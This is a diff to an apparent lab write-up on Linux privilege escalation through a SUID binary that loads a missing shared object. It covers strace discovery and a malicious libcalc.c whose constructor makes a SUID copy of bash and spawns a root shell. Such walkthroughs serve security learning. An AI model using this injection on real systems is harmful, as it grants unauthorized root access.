@@ -35,7 +35,7 @@ Section 2: Discovery.
 
 3. Step 3: Ran it
   - Ran it, to see some output, trying to gather information as what it does.
-  - <img width="890" height="93" alt="Image" src="https://github.com/user-attachments/assets/f4208bd2-7796-49a0-a425-c09955bb816f" />
+  <img width="890" height="93" alt="Image" src="https://github.com/user-attachments/assets/f4208bd2-7796-49a0-a425-c09955bb816f" />
   - Nothing interesting was found.
 
 4. Step 4: Used strace
@@ -44,15 +44,13 @@ Section 2: Discovery.
   ```bash
   strace /usr/local/bin/suid-so 2>&1
   ```
-  **Output**
-  - screen shot here
 
 5. Step 5: Filtered with grep
-  - ```bash
+  ```bash
   strace /usr/local/bin/suid-so 2>&1 | grep -ie "open|access|no file found"
   ```
   **Output**
-  - screen shot here.
+  <img width="1003" height="365" alt="Image" src="https://github.com/user-attachments/assets/bcd3d097-c827-4db7-86d1-2a29569ff986" />
 
 
 Section 3: Exploitation
@@ -61,18 +59,18 @@ Section 3: Exploitation
 2. This directory .config is not present, so we can create it and since it is writable we can create our own malicious shared object file, libcalc.so that will run when suid-so accesses it and since suid-so runs with root permissions, our libcalc.so will also get executed with root privileges.
 
 3. Step 1: Creating the missing directory.
-  -```bash
+  ```bash
   mkdir /home/user/.config/
   ```
 
 4. Step 2: Wrote malicious libcalc.c:
--```bash
+```bash
 #include <stdio.h>
 #include <stdlib.h>
 
 static void inject() __attribute__((constructor));
 void inject(){
-  system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p);
+  system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
 }
 ```
 - a. We created a inject function, and this function runs automatically, as we have declared __attribute__((constructor)), when the .so is loaded, before main()
@@ -82,7 +80,7 @@ void inject(){
 5. Step 3: Ran /usr/local/bin/suid-so 
   - it loaded our malicious libcalc.so and executed our code.
   - we got a shell.
-
+<img width="433" height="75" alt="Image" src="https://github.com/user-attachments/assets/5956386d-766d-419c-a7b6-92dab250ffe8" />
 
 After observations, where the fun began (^-^) --> 
 - I typed 'id' and 'whoami', this was the output.
